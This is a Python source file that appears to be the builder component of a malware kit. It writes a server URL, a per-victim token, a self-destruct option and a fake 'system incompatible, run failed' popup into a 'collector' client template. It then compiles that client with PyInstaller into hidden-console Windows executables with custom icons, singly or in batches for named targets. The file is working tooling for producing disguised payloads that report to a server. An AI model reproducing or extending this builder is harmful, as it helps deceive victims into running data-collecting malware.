import os
import subprocess
import sys
import shutil
import threading

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
CLIENT_SCRIPT = os.path.join(BASE_DIR, 'client', 'collector.py')
OUTPUT_DIR = os.path.join(BASE_DIR, 'output')
BUILD_DIR = os.path.join(BASE_DIR, 'client_build')

# Track async build status: {target_id: {'status': 'building'|'done'|'error', 'message': str}}
_build_status = {}
_lock = threading.Lock()


def get_build_status(target_id):
    with _lock:
        return _build_status.get(target_id, None)


def get_all_build_status():
    with _lock:
        return dict(_build_status)


def build_exe(server_url, token, target_name):
    from .config_manager import build_filename, get_icon_path

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(BUILD_DIR, exist_ok=True)

    build_script = os.path.join(BUILD_DIR, f'collector_{token[:8]}.py')
    with open(CLIENT_SCRIPT, 'r', encoding='utf-8') as f:
        script_content = f.read()

    from .config_manager import load_config
    config = load_config()

    script_content = script_content.replace('{{SERVER_URL}}', server_url)
    script_content = script_content.replace('{{TOKEN}}', token)
    script_content = script_content.replace('{{SELF_DESTRUCT}}',
        'true' if config.get('self_destruct') else 'false')
    script_content = script_content.replace('{{POPUP_ENABLED}}',
        'true' if config.get('popup_enabled', True) else 'false')
    script_content = script_content.replace('{{POPUP_MESSAGE}}',
        config.get('popup_message', '系统不兼容，运行失败!'))

    with open(build_script, 'w', encoding='utf-8') as f:
        f.write(script_content)

    exe_name = build_filename(target_name, token)

    icon_path = get_icon_path()

    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--name', exe_name,
        '--distpath', OUTPUT_DIR,
        '--workpath', os.path.join(BUILD_DIR, 'pyi_work'),
        '--specpath', BUILD_DIR,
        build_script,
    ]

    if icon_path and os.path.exists(icon_path):
        cmd.insert(-1, f'--icon={icon_path}')

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

    try:
        os.remove(build_script)
    except Exception:
        pass

    if result.returncode != 0:
        raise RuntimeError(f"PyInstaller failed: {result.stderr}")

    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
    if not os.path.exists(exe_path):
        raise RuntimeError(f"EXE not found at expected path: {exe_path}")

    return exe_path


def build_exe_async(server_url, token, target_name, target_id):
    """Start an async build, returns immediately. Status tracked in _build_status."""
    with _lock:
        _build_status[target_id] = {'status': 'building', 'message': '正在打包...'}

    def _run():
        try:
            build_exe(server_url, token, target_name)
            with _lock:
                _build_status[target_id] = {'status': 'done', 'message': '生成完毕'}
        except Exception as e:
            with _lock:
                _build_status[target_id] = {'status': 'error', 'message': str(e)}

    t = threading.Thread(target=_run, daemon=True)
    t.start()


def build_exes_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            exe_path = build_exe(server_url, t['token'], t['name'])
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': True,
                'exe_path': exe_path,
                'exe_name': os.path.basename(exe_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': False,
                'error': str(e),
            })
    return results


def clean_build_artifacts():
    for path in [BUILD_DIR]:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
            except Exception:
                pass
    for f in os.listdir(BASE_DIR):
        if f.endswith('.spec'):
            try:
                os.remove(os.path.join(BASE_DIR, f))
            except Exception:
                pass
